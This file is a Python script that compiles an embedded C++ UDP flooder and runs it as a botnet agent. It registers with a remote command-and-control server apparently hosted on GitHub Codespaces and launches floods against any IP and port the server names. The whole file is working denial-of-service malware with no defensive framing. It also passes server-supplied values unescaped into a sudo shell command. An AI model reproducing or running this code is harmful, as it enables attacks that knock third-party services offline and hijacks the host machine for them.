import os
import requests
import time

API_URL = "https://obscure-engine-vgqvxvrjrwqh6vq-5000.app.github.dev"

CPP_CODE = """
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <chrono>
#include <random>

int main(int argc, char *argv[]) {
    if(argc < 5) return 1;
    std::string ip = argv[1]; int port = atoi(argv[2]); int duration = atoi(argv[3]); int workers = atoi(argv[4]);
    for (int i = 0; i < workers; i++) {
        if (fork() == 0) {
            int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(port); sin.sin_addr.s_addr = inet_addr(ip.c_str());
            char payload[512]; std::mt19937 rng(std::random_device{}()); std::uniform_int_distribution<int> dist(20, 500);
            auto start = std::chrono::high_resolution_clock::now();
            while (true) {
                auto now = std::chrono::high_resolution_clock::now();
                if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >= duration) break;
                int sz = dist(rng); memset(payload, rand()%255, sz);
                sendto(s, payload, sz, 0, (struct sockaddr *) &sin, sizeof(sin));
            }
            exit(0);
        }
    }
    return 0;
}
"""

def setup():
    with open("flood.cpp", "w") as f:
        f.write(CPP_CODE)
    os.system("g++ -O3 flood.cpp -o flood")

def main():
    setup()
    while True:
        try:
            requests.post(f"{API_URL}/register", json={"ip": "codespace-1"}, timeout=5)
            res = requests.get(f"{API_URL}/status", timeout=5).json()
            if res.get("command") and res["command"].get("ip"):
                cmd = res["command"]
                os.system(f"sudo ./flood {cmd['ip']} {cmd['port']} {cmd['duration']} {cmd['workers']} &")
                time.sleep(cmd['duration'] + 5)
        except:
            pass
        time.sleep(10)

if __name__ == "__main__":
    main()
EOF
